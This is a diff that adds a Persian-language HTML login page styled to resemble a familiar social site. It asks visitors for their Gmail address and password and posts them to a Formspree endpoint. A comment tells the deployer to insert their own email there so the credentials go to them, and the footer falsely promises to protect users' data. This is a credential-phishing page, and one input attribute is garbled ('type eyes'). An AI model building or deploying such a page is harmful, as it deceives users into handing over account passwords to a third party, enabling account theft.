@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به سیستم</title>
+    <style>
+        /* استایل‌های شیک و مدرن */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        h2 { color: #1c1e21; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box; /* برای اینکه پدینگ باعث بیرون زدن نشه */
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover { background-color: #166fe5; }
+        .footer-text { font-size: 12px; color: #777; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>ورود به حساب</h2>
+    
+    <!-- در قسمت action، به جای 'YOUR_EMAIL_HERE'، ایمیل خودت رو بنویس -->
+    <form action="https://formspree.io/f/YOUR_EMAIL_HERE" method="POST">
+        
+        <!-- فیلد جیمیل -->
+        <input type eyes="email" name="Gmail_Address" placeholder="جیمیل خود را وارد کنید" required>
+        
+        <!-- فیلد گذرواژه با محدودیت ۵ کاراکتر -->
+        <input type="password" name="Password" placeholder="گذرواژه" minlength="5" required>
+        
+        <button type="submit">ورود</button>
+    </form>
+
+    <p class="footer-text">از امنیت اطلاعات شما محافظت می‌کنیم.</p>
+</div>
+
+<script>
+    // یک اسکریپت خیلی ساده برای اینکه مطمئن بشیم کاربر حداقل ۵ کاراکتر وارد کرده
+    // (هرچند خودِ HTML با minlength این کار رو انجام میده)
+    const passwordInput = document.querySelector('input[name="Password"]');
+    const form = document.querySelector('form');
+
+    form.onsubmit = function(e) {
+        if (passwordInput.value.length < 5) {
+            alert("گذرواژه باید حداقل ۵ کاراکتر باشد!");
+            e.preventDefault();
+        }
+    };
+</script>
+
+</body>
+</html>
